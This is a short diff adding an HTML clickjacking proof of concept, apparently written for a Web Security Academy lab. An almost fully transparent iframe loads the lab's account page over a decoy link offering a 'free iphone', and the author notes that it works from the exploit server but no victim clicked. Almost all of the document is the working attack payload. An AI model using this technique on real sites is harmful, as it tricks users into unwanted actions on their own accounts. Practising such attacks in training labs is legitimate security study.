@@ -1,0 +1,22 @@
+<style>
+iframe {
+        position:relative;
+        width:1000px;
+        height: 700px;
+        opacity: 0.0000001;
+        z-index: 2;
+    }
+div{
+        position:absolute;
+        top:480;
+        left: 70px;
+        z-index: 1;
+}
+</style>
+
+<div>CLICK meeee for free iphone</div>
+
+<iframe src="https://0ac8005c03144e7981697ab6009e00e9.web-security-academy.net/my-account" height="200px" width="200px"></iframe>
+
+
+using this as the exploit server works, however due to the network issues there is no user to click on it
